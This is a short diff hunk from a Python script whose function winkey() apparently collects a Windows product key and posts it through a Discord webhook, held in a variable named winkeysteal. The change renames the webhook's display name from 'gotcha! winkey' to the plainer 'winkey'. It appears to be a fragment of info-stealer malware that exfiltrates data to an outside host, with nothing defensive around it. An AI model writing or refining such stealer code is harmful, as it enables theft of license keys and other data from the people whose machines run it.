@@ -23,7 +23,7 @@ def winkey():
         )
     embed.set_thumbnail('https://wallpaperaccess.com/full/1129133.jpg')
     winkeysteal = Webhook(winkey_hook)
-    winkeysteal.username = 'gotcha! winkey'
+    winkeysteal.username = 'winkey'
     winkeysteal.avatar_url = 'https://cdn.discordapp.com/attachments/739948762792984590/791347256103796796/1129133.png'
     winkeysteal.send(embed=embed)
 
